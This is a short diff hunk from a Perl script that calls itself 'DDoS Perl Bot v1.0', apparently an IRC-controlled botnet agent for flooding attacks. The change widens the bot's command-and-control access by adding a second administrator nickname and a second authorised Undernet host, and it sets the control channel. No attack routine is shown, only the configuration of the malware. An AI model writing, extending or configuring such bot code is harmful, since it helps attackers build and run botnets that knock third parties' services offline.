@@ -141,8 +141,8 @@ my $sleep='5';
 my $homedir = "/tmp";
 my $version = 'DDoS Perl Bot v1.0';
  
-my @admins = ("moe");
-my @hostauth = ("lilmoe.users.undernet.org");
+my @admins = ("lilmoe","moe");
+my @hostauth = ("lilmoe.users.undernet.org","moe.users.undernet.org");
 my @channels = ("#gpt");
  
 my $pacotes = 1;
